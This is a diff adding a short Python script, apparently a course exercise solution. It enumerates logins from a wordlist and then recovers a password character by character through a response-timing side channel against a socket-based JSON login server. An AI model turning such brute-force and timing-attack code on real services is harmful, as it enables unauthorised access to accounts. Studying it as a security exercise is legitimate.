@@ -1,0 +1,44 @@
+import socket
+import sys
+import json
+import string
+import time
+
+def lg_pwd(lg, pwd):
+    return json.dumps({'login': lg, 'password': pwd})
+
+def find_login(lg_list):
+    for lg in lg_list:
+        s.send(lg_pwd(lg, '').encode())
+        r = json.loads(s.recv(1024).decode())['result']
+
+        if r != 'Wrong login!':
+            return lg
+
+def find_password(lg):
+    chars, pwd = string.ascii_letters + string.digits, ''
+
+    while 1:
+        for c in chars:
+            s.send(lg_pwd(lg, pwd+c).encode())
+
+            start = time.perf_counter()
+            
+            r = json.loads(s.recv(1024).decode())['result']
+
+            if time.perf_counter() - start >= 0.1:
+                pwd += c
+
+            if r == 'Connection success!':
+                return pwd+c
+
+with socket.socket() as s, open("/Users/frankzhang/Library/Mobile Documents/com~apple~CloudDocs/Downloads/logins.txt") as lg_file:
+    hostname, port = sys.argv[1:]
+    s.connect((hostname, int(port)))
+
+    lg_list = lg_file.read().split('\n')
+
+    lg = find_login(lg_list)
+    pwd = find_password(lg)
+
+    print(lg_pwd(lg, pwd))
